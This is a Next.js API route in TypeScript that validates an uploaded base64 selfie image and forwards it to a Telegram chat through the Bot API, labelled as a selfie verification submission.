import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const { image } = await request.json()

    if (typeof image !== "string" || !image.startsWith("data:image/")) {
      return NextResponse.json({ error: "Invalid image" }, { status: 400 })
    }

    const token = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!token || !chatId) {
      console.error("[v0] Telegram credentials are not configured")
      return NextResponse.json({ error: "Telegram is not configured" }, { status: 500 })
    }

    const base64Data = image.split(",")[1] ?? ""
    if (!base64Data) {
      return NextResponse.json({ error: "Invalid image" }, { status: 400 })
    }

    const buffer = Buffer.from(base64Data, "base64")
    if (buffer.length === 0 || buffer.length > 8 * 1024 * 1024) {
      return NextResponse.json({ error: "Image too large" }, { status: 400 })
    }

    const form = new FormData()
    form.append("chat_id", chatId)
    form.append("caption", "New selfie verification submitted")
    form.append("photo", new Blob([buffer], { type: "image/png" }), "selfie.png")

    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: form,
    })

    if (!telegramResponse.ok) {
      console.error("[v0] Telegram photo upload failed", telegramResponse.status)
      return NextResponse.json({ error: "Unable to upload selfie" }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error("[v0] Selfie upload error", error)
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}
